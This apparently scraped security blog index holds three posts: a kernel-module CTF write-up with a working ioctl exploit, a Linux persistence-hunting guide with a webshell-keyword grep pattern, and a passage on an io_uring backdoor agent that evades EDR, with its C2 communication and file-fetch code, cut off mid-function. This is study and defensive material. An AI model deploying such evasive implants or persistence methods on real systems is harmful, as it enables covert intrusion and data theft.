retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\nWhat we have:\nA hidden kernel module loaded at boot Character device at /dev/ioctl_dev Setup script (device.sh) that loads the module and shreds source files SSH access enabled (username: root, password: ioctl) Important Note: Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, SSH is enabled for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\nGetting Started - VM Access \u0026amp; SSH When you boot the VM, you\u0026rsquo;ll see the login screen. The credentials are straightforward:\nUsername: root Password: ioctl Setting Up SSH Access After logging in, the first thing you should do is check the VM\u0026rsquo;s IP address to enable SSH access. This makes the challenge much more comfortable as you can:\nCopy and paste code easily Use multiple terminal windows Access from your preferred terminal emulator Run ip a to get the network configuration:\nAs we can see, the VM has IP 192.168.200.165. Now we can SSH from our host machine:\nssh root@192.168.200.165 Initial Reconnaissance Now that we\u0026rsquo;re comfortably connected via SSH, let\u0026rsquo;s explore what we have on the system.\nChecking for the Device The challenge mentions a device at /dev/ioctl_dev. Let\u0026rsquo;s verify it exists:\nroot@hunter:~# ls -lah /dev/ioctl_dev crw------- 1 root root 237, 0 Nov 9 16:15 /dev/ioctl_dev Perfect! The device exists with:\nType: Character device (c) Permissions: root only Major number: 237 Minor number: 0 Reverse Engineering the Kernel Module Time to analyze the kernel object (device.ko)! I\u0026rsquo;ll be using binary ninja for this, but Ghidra or IDA work just as well.\nLoading device.ko into binary ninja After loading device.ko into binary ninja and letting it analyze, we can see several interesting functions in the symbol:\nKey functions identified:\nioctl_handler - The main function we need to understand init_module - Module initialization hide - Module hiding functionality cleanup_module - Module cleanup Analyzing ioctl_handler() This is where the magic happens! Let\u0026rsquo;s examine the decompiled code:\nint64_t ioctl_handler() { int64_t rdx_2; int32_t rsi_3; rdx_2 = __fentry__(); void* gsbase; int64_t rax = *(uint64_t*)((char*)gsbase + 0x28); int32_t var_7c; int32_t var_78; if (rsi_3 == 0xc0487213 \u0026amp;\u0026amp; !_copy_from_user(\u0026amp;var_7c, rdx_2, 0x48) \u0026amp;\u0026amp; var_7c == 0x1337dead \u0026amp;\u0026amp; var_78 == 0xcafebabe) { int64_t var_74; __builtin_strncpy(\u0026amp;var_74, \u0026#34;ROOTKIT{fake_flag_for_you}\u0026#34;, 0x1b); _copy_to_user(rdx_2, \u0026amp;var_7c, 0x48); } if (rax == *(uint64_t*)((char*)gsbase + 0x28)) return __x86_return_thunk(); __stack_chk_fail(); } findings:\nioctl Command Check: rsi_3 == 0xc0487213\nThis is the ioctl request number we need to use Buffer Size: _copy_from_user(\u0026amp;var_7c, rdx_2, 0x48)\nExpects exactly 0x48 bytes (72 bytes) Magic Value #1: var_7c == 0x1337dead\nFirst 4 bytes must be 0x1337DEAD Magic Value #2: var_78 == 0xcafebabe\nNext 4 bytes must be 0xCAFEBABE Understanding the init_module() Let\u0026rsquo;s also check how the device gets created:\nint64_t init_module() { __fentry__(); uint32_t rax = __register_chrdev(0, 0, 0x100, \u0026#34;ioctl_dev\u0026#34;, \u0026amp;fops); major = rax; if (rax \u0026gt;= 0) { uint64_t rax_1 = __class_create(\u0026amp;__this_module, \u0026#34;ioctl_class\u0026#34;, \u0026amp;__key.2); ioctl_class = rax_1; if (rax_1 \u0026lt;= -0x1000) { uint64_t rax_3 = device_create(rax_1, 0, (uint64_t)(major \u0026lt;\u0026lt; 0x14), 0, \u0026#34;ioctl_dev\u0026#34;); __key.2 = rax_3; if (rax_3 \u0026lt;= -0x1000) { hide(); _printk(0x400326); } } } return __x86_return_thunk(); } The device_create() call creates our /dev/ioctl_dev device with:\nDevice class: ioctl_class Device name: ioctl_dev Major number: dynamically allocated (237 in our case) After successful creation, it calls hide() to make the module invisible to lsmod.\nWriting the Exploit Now that we understand the requirements, let\u0026rsquo;s write our exploit code!\nThe Exploit Create a 72-byte buffer Write 0x1337DEAD at offset 0 Write 0xCAFEBABE at offset 4 Open /dev/ioctl_dev Call ioctl with command 0xc0487213 Read the flag from the returned buffer exploit.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { int fd; char buf[0x48]; uint32_t val1 = 0x1337DEAD; uint32_t val2 = 0xCAFEBABE; memset(buf, 0, sizeof(buf)); *(uint32_t*)buf = val1; *(uint32_t*)(buf + 4) = val2; fd = open(\u0026#34;/dev/ioctl_dev\u0026#34;, O_RDWR); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); return 1; } if (ioctl(fd, 0xc0487213, buf) \u0026lt; 0) { perror(\u0026#34;ioctl\u0026#34;); close(fd); return 1; } printf(\u0026#34;Flag: %s\\n\u0026#34;, buf); close(fd); return 0; } Compiling and Running Since we\u0026rsquo;re connected via SSH, we can easily copy the code and compile it:\nroot@hunter:~# gcc exploit.c -o exploit root@hunter:~# ./exploit Flag: ROOTKIT{ioctl_secret_unlocked@1337} Success! We\u0026rsquo;ve captured the flag!\nWhy It Works The exploit works because the kernel module uses the same buffer for both receiving input and sending output. We create a 72-byte buffer (buf[0x48]), write the magic values 0x1337DEAD and 0xCAFEBABE at the beginning using pointer casting ((uint32_t)buf), then open the device and call ioctl() with command 0xc0487213.\nThe kernel validates our magic values with _copy_from_user(), and if they match, uses _copy_to_user() with the same pointer to overwrite our buffer with the flag.\nKey Lessons Learned 1. Check dmesg for Kernel Activity Kernel messages provided crucial information about module loading and potential issues.\n2. Understand ioctl Communication The ioctl interface is a powerful way for userspace to communicate with kernel drivers. Understanding the command numbers and data structures is essential.\n3. Reversing Skills Being comfortable with tools like Ghidra, IDA, or Binary Ninja is crucial for kernel module analysis.\nConclusion This challenge was an excellent introduction to Reversing and you can learn:\nLinux kernel modules Reverse engineering Crafting ioctl requests Recognizing rootkit techniques Our Community Join the Rootkit Researchers community:\nDiscord Server\nChallenge created by Matheuz - Have fun guys!!\nThanks for reading! If you enjoyed this writeup, consider sharing it with others who might find it useful. Happy hacking!\n","permalink":"http://localhost:1313/hacking/ioctl-secrets/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/ZTjHU7a.jpeg\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cp\u003eIn this challenge, we\u0026rsquo;re given access to a Linux virtual machine (VM) running Ubuntu. The objective is to exploit a custom kernel module to retrieve a hidden flag. The challenge involves reverse engineering, kernel internals, and crafting a proper exploit.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat we have:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA hidden kernel module loaded at boot\u003c/li\u003e\n\u003cli\u003eCharacter device at \u003ccode\u003e/dev/ioctl_dev\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSetup script (\u003ccode\u003edevice.sh\u003c/code\u003e) that loads the module and shreds source files\u003c/li\u003e\n\u003cli\u003eSSH access enabled (username: \u003ccode\u003eroot\u003c/code\u003e, password: \u003ccode\u003eioctl\u003c/code\u003e)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eImportant Note:\u003c/strong\u003e Many participants had difficulties copy-pasting code directly into the VM console. As stated in the challenge description, \u003cstrong\u003eSSH is enabled\u003c/strong\u003e for easier interaction! This was a common pain point, so let\u0026rsquo;s start by addressing it.\u003c/p\u003e","title":"Ioctl Secrets Writeup"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using asynchronous io_uring calls, in a way that is robust against partial sends. It works in a loop that continues until all requested bytes have been sent. For each iteration, it obtains an SQE (Submission Queue Entry) from io_uring, prepares a send (io_uring_prep_send) from the point not yet transmitted in the buffer, submits the operation, and waits for the result in the Completion Queue.\nUpon receiving confirmation from the kernel, it checks whether there was an error or whether the socket was closed (return zero or negative). If there was no error, it adds the sent bytes to the total and repeats until finished.\nThe goal is to abstract the normal limitations of the traditional send (which can send only part of the data) and perform the complete send with the minimum of blocking calls, taking advantage of the asynchronous and efficient io_uring model.\nrecv_all:\nssize_t recv_all(struct io_uring *ring, int sockfd, char *buf, size_t len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_recv(sqe, sockfd, buf, len, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); return ret; } This function reads data from a socket, also using io_uring asynchronously. Unlike send_all, it only reads once per call, since a recv is usually enough to receive the entire expected packet, without worrying about ensuring that the entire buffer has been filled.\nIt obtains the SQE, configures the receive operation (io_uring_prep_recv) with the buffer size, submits it to the kernel, and waits for the result via Completion Queue.\nIt then marks the CQE as processed and returns the number of bytes received to the caller. Thus, the function integrates data reception into the same asynchronous queue, maintaining high performance without blocking the thread.\nread_file_uring:\nThis function encapsulates the reading of an entire file using asynchronous io_uring operations, without relying on traditional blocking calls. It first opens the file with io_uring_prep_openat, waits for the result, and if successful, enters a loop to read chunks of the file in successive blocks, using io_uring_prep_read.\nEach block read is accumulated in a buffer, and the offset advances as it progresses. Reading continues until the buffer is full or until it reaches the end of the file (returning zero or negative on read). Finally, it closes the file and returns the total bytes loaded. It is a useful function to bring entire files into memory in a non-blocking way, always taking advantage of io_uring.\ncmd_users:\nvoid cmd_users(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/var/run/utmp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /var/run/utmp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } int count = ret / sizeof(struct utmp); struct utmp *entries = (struct utmp*)buf; char out[8192]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Logged users:\\n\u0026#34;); for (int i = 0; i \u0026lt; count; i++) { if (entries[i].ut_type == USER_PROCESS) { out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-8s %-8s\\n\u0026#34;, entries[i].ut_user, entries[i].ut_line); if (out_pos \u0026gt; sizeof(out) - 100) break; } } send_all(ring, sockfd, out, out_pos); } This function implements the users command, listing the users logged into the system. It reads the /var/run/utmp file (where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, \u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, 